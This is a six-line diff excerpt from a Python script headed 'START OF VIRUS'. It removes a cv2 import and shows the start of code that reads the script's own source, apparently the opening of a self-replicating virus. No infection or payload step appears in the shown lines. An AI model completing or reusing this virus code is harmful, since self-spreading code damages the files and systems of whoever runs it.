@@ -1,6 +1,6 @@
 ### START OF VIRUS ###
 
-import sys, glob, cv2
+import sys, glob
 import subprocess, pkg_resources
 code = []
 with open(sys.argv[0], 'r') as f:
